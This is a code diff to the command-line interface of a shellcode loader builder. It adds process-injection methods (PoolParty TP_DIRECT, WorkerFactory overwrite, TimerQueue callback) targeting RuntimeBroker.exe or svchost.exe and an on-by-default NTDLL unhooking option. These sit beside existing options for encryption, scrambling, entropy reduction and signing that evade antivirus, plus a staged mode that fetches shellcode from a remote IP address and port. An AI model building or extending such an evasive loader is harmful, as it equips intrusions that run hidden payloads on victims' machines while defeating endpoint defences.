@@ -34,7 +34,7 @@ def main():
     parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
     parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
     parser_staged.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
-    parser_staged.add_argument("-inj", "--inject-method", type=str, choices=["apc", "copyfile2"], default="apc", help="Choose injection method: 'apc' for APC injection or 'copyfile2' for CopyFile2 progress callback execution (default: apc).")
+    parser_staged.add_argument("-inj", "--inject-method", type=str, choices=["apc", "copyfile2", "tp_direct", "wf_overwrite", "timerqueue"], default="apc", help="Choose injection method: 'apc' (EarlyBird APC), 'copyfile2' (CopyFile2 callback), 'tp_direct' (PoolParty TP_DIRECT), 'wf_overwrite' (PoolParty WorkerFactory overwrite), 'timerqueue' (TimerQueue callback). Default: apc.")
     parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address from where your shellcode is gonna be fetched.", required=True)
     parser_staged.add_argument("-po", "--port", type=int, help="Port from where the HTTP connection is gonna fetch your shellcode.", required=True)
     parser_staged.add_argument("-pa", "--path", type=str, help="Path from where your shellcode is gonna be fetched.", required=True)
@@ -44,6 +44,8 @@ def main():
     parser_staged.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
     parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
     parser_staged.add_argument("-er", "--entropy-reduction", action="store_true", help="Reduce binary entropy by embedding English text padding.")
+    parser_staged.add_argument("--no-unhook", dest="unhook", action="store_false", help="Disable NTDLL unhooking via Known DLLs technique.")
+    parser_staged.set_defaults(unhook=True)
     parser_staged.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
     parser_staged.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
     parser_staged.epilog = "Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s --https --user-agent 'CustomAgent/1.0' -pfx cert.pfx -pfx-pass 'password'"
@@ -53,10 +55,12 @@ def main():
     parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
     parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
     parser_stageless.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
-    parser_stageless.add_argument("-inj", "--inject-method", type=str, choices=["apc", "copyfile2"], default="apc", help="Choose injection method: 'apc' for APC injection or 'copyfile2' for CopyFile2 progress callback execution (default: apc).")
+    parser_stageless.add_argument("-inj", "--inject-method", type=str, choices=["apc", "copyfile2", "tp_direct", "wf_overwrite", "timerqueue"], default="apc", help="Choose injection method: 'apc' (EarlyBird APC), 'copyfile2' (CopyFile2 callback), 'tp_direct' (PoolParty TP_DIRECT), 'wf_overwrite' (PoolParty WorkerFactory overwrite), 'timerqueue' (TimerQueue callback). Default: apc.")
     parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
     parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
     parser_stageless.add_argument("-er", "--entropy-reduction", action="store_true", help="Reduce binary entropy by embedding English text padding.")
+    parser_stageless.add_argument("--no-unhook", dest="unhook", action="store_false", help="Disable NTDLL unhooking via Known DLLs technique.")
+    parser_stageless.set_defaults(unhook=True)
     parser_stageless.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
     parser_stageless.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
     parser_stageless.epilog = "Example usage: python main.py stageless -p shellcode.bin -e -s -pfx cert.pfx -pfx-pass 'password'"
@@ -73,6 +77,7 @@ def main():
         target_process=args.apc,
         encrypt=args.encrypt,
         scramble=args.scramble,
+        unhook=args.unhook,
         entropy_reduction=args.entropy_reduction,
         pfx=args.pfx,
         pfx_password=args.pfx_password,
